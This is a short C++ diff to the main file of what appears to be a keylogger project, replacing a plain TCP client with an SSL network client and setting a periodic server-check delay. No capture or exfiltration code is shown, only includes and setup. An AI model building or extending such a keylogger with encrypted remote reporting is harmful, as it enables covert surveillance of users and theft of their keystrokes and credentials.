@@ -1,16 +1,15 @@
 #include <iostream>
 #include <errno.h>
-#include "TCPClient.hpp"
+#include <iostream>
+#include <ctime>
+
 #include "KeyLoger.hpp"
 #include "Parser.hpp"
-
-#include <iostream>
-
-#include <ctime>
+#include "SSLNetwork.hpp"
 
 int main(int argc, char **argv)
 {
-	TCPClient client;
+	SSLNetwork client;
 	Parser	parser(client);
 	const int serverCheckDelay = 2*60;
 	unsigned long timestamp;
